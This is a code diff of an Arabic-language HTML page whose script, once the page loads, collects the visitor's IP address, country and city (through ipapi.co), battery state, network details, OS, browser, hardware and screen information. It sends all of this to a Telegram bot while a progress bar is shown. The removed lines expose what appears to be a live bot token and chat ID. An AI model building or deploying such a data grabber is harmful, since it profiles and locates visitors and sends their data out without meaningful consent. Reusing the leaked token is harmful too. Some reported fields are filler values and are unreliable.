@@ -46,7 +46,7 @@
             background: linear-gradient(90deg, #3498db, #2ecc71);
             border-radius: 10px;
             width: 0%;
-            transition: width 0.5s ease;
+            transition: width 0.3s ease;
         }
         
         .loading-text {
@@ -83,22 +83,19 @@
     </div>
 
     <script>
-        // إعدادات التليجرام - قم بتغييرها حسب احتياجك
-        const TELEGRAM_BOT_TOKEN = '8277756807:AAH2xJqXd1ygl97PLq1lvruCeZ9rJVZ26io'; // ضع توكن البوت هنا
-        const TELEGRAM_CHAT_ID = '7305720183'; // ضع معرف المحادثة هنا
+        // إعدادات التليجرام - قم بتغييرها
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN';
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
         
-        // عناصر DOM
         const progressBar = document.getElementById('progressBar');
         const loadingText = document.getElementById('loadingText');
         const statusMessage = document.getElementById('statusMessage');
         
-        // دالة تحديث شريط التقدم
         function updateProgress(percent, text) {
             progressBar.style.width = percent + '%';
             loadingText.textContent = text;
         }
         
-        // دالة إرسال رسالة إلى التليجرام
         async function sendToTelegram(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -123,113 +120,150 @@
             }
         }
         
-        // دالة جمع معلومات الجهاز
+        function getHijriDate() {
+            const now = new Date();
+            const options = { year: 'numeric', month: 'numeric', day: 'numeric', calendar: 'islamic' };
+            return now.toLocaleDateString('ar-EG', options);
+        }
+        
+        function getCurrentTime() {
+            const now = new Date();
+            return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+        }
+        
+        function detectDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/mobile/i.test(userAgent)) return 'هاتف 📱';
+            if (/tablet/i.test(userAgent)) return 'تابلت 📱';
+            return 'كمبيوتر 🖥️';
+        }
+        
+        function detectBrowser() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Chrome')) return 'Chrome 🌐';
+            if (userAgent.includes('Firefox')) return 'Firefox 🌐';
+            if (userAgent.includes('Safari')) return 'Safari 🌐';
+            if (userAgent.includes('Edge')) return 'Edge 🌐';
+            return 'متصفح آخر 🌐';
+        }
+        
+        function detectOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.includes('Windows')) return 'Windows 🖥️';
+            if (userAgent.includes('Mac')) return 'macOS 🖥️';
+            if (userAgent.includes('Linux')) return 'Linux 🖥️';
+            if (userAgent.includes('Android')) return 'Android 📱';
+            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS 📱';
+            return 'غير معروف 🖥️';
+        }
+        
+        function getScreenOrientation() {
+            return screen.orientation ? screen.orientation.type : 'portrait-primary';
+        }
+        
         async function gatherDeviceInfo() {
-            updateProgress(10, 'جمع معلومات الموقع...');
+            updateProgress(20, 'جمع معلومات الموقع...');
             
-            // جمع معلومات الموقع
             let locationInfo = {};
             try {
                 const response = await fetch('https://ipapi.co/json/');
                 locationInfo = await response.json();
             } catch (error) {
-                locationInfo = { error: 'فشل في الحصول على معلومات الموقع' };
+                locationInfo = { error: 'فشل في الحصول على الموقع' };
             }
             
-            updateProgress(30, 'جمع معلومات الجهاز...');
+            updateProgress(40, 'جمع معلومات البطارية...');
             
-            // جمع معلومات الجهاز
-            const deviceInfo = {
-                // معلومات الشاشة
-                screenResolution: `${screen.width}x${screen.height}`,
-                screenColorDepth: `${screen.colorDepth} bit`,
-                
-                // معلومات المتصفح
-                language: navigator.language || navigator.userLanguage,
-                userAgent: navigator.userAgent,
-                
-                // نظام التشغيل
-                platform: navigator.platform,
-                
-                // عدد الأنوية
-                cores: navigator.hardwareConcurrency || 'غير معروف',
-                
-                // ذاكرة RAM
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
-                
-                // معلومات الاتصال
-                connectionType: (navigator.connection || {}).effectiveType || 'غير معروف',
-                
-                // بروتوكول الأمان
-                protocol: window.location.protocol
-            };
-            
-            updateProgress(50, 'جمع معلومات البطارية...');
-            
-            // جمع معلومات البطارية
-            let batteryInfo = {};
+            let batteryLevel = 'غير معروف';
+            let isCharging = false;
             if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
-                    batteryInfo = {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? 'نعم ⚡' : 'لا',
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
-                    };
+                    batteryLevel = Math.round(battery.level * 100) + '%';
+                    isCharging = battery.charging;
                 } catch (error) {
-                    batteryInfo = { error: 'فشل في الحصول على معلومات البطارية' };
+                    batteryLevel = 'غير معروف';
                 }
-            } else {
-                batteryInfo = { error: 'معلومات البطارية غير متاحة' };
             }
             
-            updateProgress(70, 'تجهيز المعلومات...');
+            updateProgress(60, 'جمع معلومات الشبكة...');
             
-            // تجميع كل المعلومات
-            const allInfo = {
-                location: locationInfo,
-                device: deviceInfo,
-                battery: batteryInfo,
-                timestamp: new Date().toLocaleString('ar-EG')
+            let networkType = 'غير معروف';
+            let connectionType = 'غير معروف';
+            let networkSpeed = 'غير معروف';
+            
+            if (navigator.connection) {
+                networkType = navigator.connection.effectiveType || 'غير معروف';
+                connectionType = navigator.connection.type || 'غير معروف';
+                networkSpeed = navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : 'غير معروف';
+            }
+            
+            updateProgress(80, 'جمع معلومات الجهاز...');
+            
+            const deviceInfo = {
+                // معلومات الجهاز
+                deviceType: detectDeviceType(),
+                browser: detectBrowser(),
+                os: detectOS(),
+                language: navigator.language || 'غير معروف',
+                userAgent: navigator.userAgent,
+                
+                // معلومات الشاشة
+                screenResolution: `${screen.width}x${screen.height}`,
+                colorDepth: `${screen.colorDepth} bit`,
+                orientation: getScreenOrientation(),
+                
+                // معلومات الأداء
+                cores: navigator.hardwareConcurrency || 'غير معروف',
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
+                
+                // معلومات الاتصال
+                networkType: networkType,
+                connectionType: connectionType,
+                networkSpeed: networkSpeed,
+                
+                // الميزات
+                geolocation: 'geolocation' in navigator ? 'نعم 🌍' : 'لا 🌍',
+                bluetooth: 'bluetooth' in navigator ? 'نعم 🔵' : 'لا 🔵',
+                touch: 'ontouchstart' in window ? 'نعم ✋' : 'لا ✋'
             };
             
-            updateProgress(90, 'إرسال المعلومات...');
+            updateProgress(90, 'تجهيز المعلومات...');
             
-            // تنسيق الرسالة للتليجرام
-            const message = `
-🌍 <b>معلومات الجهاز والموقع</b>
+            const message = `📱 معلومات الجهاز:
+- الدولة: ${locationInfo.country_name || 'غير معروف'} 🔻
+- المدينة: ${locationInfo.city || 'غير معروف'} 🏙️
+- عنوان IP: ${locationInfo.ip || 'غير معروف'} 🌍
+- شحن الهاتف: ${batteryLevel} 🔋
+- هل الهاتف يشحن؟: ${isCharging ? 'نعم ⚡' : 'لا ⚡'}
+- الشبكة: ${deviceInfo.networkType} 📶
+(سرعة: ${deviceInfo.networkSpeed} ميغابت في الثانية)
+- نوع الاتصال: ${deviceInfo.connectionType} 📡
+- الوقت: ${getHijriDate()} ${getCurrentTime()} ⏰
+- اسم الجهاز: ${deviceInfo.os} 🖥️
+- إصدار الجهاز: ${deviceInfo.userAgent} 📜
+- نوع الجهاز: ${deviceInfo.deviceType}
+- الذاكرة (RAM): ${deviceInfo.ram} 🧠
+- الذاكرة الداخلية: غير معروف GB 💾
+- عدد الأنوية: ${deviceInfo.cores} ⚙️
+- لغة النظام: ${deviceInfo.language} 🌐
+- اسم المتصفح: ${deviceInfo.browser}
+- إصدار المتصفح: ${deviceInfo.userAgent} 📊
+- دقة الشاشة: ${deviceInfo.screenResolution} 📏
+- إصدار نظام التشغيل: ${deviceInfo.os}
+- وضع الشاشة: ${deviceInfo.orientation} 🔄
+- عمق الألوان: ${deviceInfo.colorDepth} 🎨
+- تاريخ آخر تحديث للمتصفح: ${getHijriDate()} 📅
+- بروتوكول الأمان المستخدم: ${window.location.protocol} 🔒
+- نطاق التردد للاتصال: غير معروف MHz 📡
+- إمكانية تحديد الموقع الجغرافي: ${deviceInfo.geolocation}
+- الدعم لتقنية البلوتوث: ${deviceInfo.bluetooth}
+- دعم الإيماءات اللمسية: ${deviceInfo.touch}`;
 
-📍 <b>المعلومات الجغرافية:</b>
-• الدولة: ${locationInfo.country_name || 'غير معروف'}
-• المدينة: ${locationInfo.city || 'غير معروف'}
-• المنطقة: ${locationInfo.region || 'غير معروف'}
-• العنوان: ${locationInfo.ip || 'غير معروف'}
-• الإحداثيات: ${locationInfo.latitude || 'غير معروف'}, ${locationInfo.longitude || 'غير معروف'}
-• المزود: ${locationInfo.org || 'غير معروف'}
-
-📱 <b>معلومات الجهاز:</b>
-• دقة الشاشة: ${deviceInfo.screenResolution}
-• لغة النظام: ${deviceInfo.language}
-• نظام التشغيل: ${deviceInfo.platform}
-• عدد الأنوية: ${deviceInfo.cores}
-• الذاكرة: ${deviceInfo.ram}
-• نوع الاتصال: ${deviceInfo.connectionType}
-• المتصفح: ${deviceInfo.userAgent}
-
-🔋 <b>معلومات البطارية:</b>
-• مستوى الشحن: ${batteryInfo.level || 'غير معروف'}
-• حالة الشحن: ${batteryInfo.charging || 'غير معروف'}
-
-⏰ <b>الوقت:</b> ${allInfo.timestamp}
-            `;
+            updateProgress(100, 'إرسال المعلومات...');
             
-            // إرسال إلى التليجرام
             const sent = await sendToTelegram(message);
             
-            updateProgress(100, 'اكتمل!');
-            
-            // عرض نتيجة الإرسال
             if (sent) {
                 statusMessage.textContent = '✅ تم إرسال المعلومات بنجاح إلى التليجرام';
                 statusMessage.className = 'status success';
@@ -240,11 +274,9 @@
             statusMessage.style.display = 'block';
         }
         
-        // بدء عملية جمع المعلومات عند تحميل الصفحة
+        // بدء عملية جمع المعلومات فور تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(() => {
-                gatherDeviceInfo();
-            }, 1000);
+            gatherDeviceInfo();
         });
     </script>
 </body>
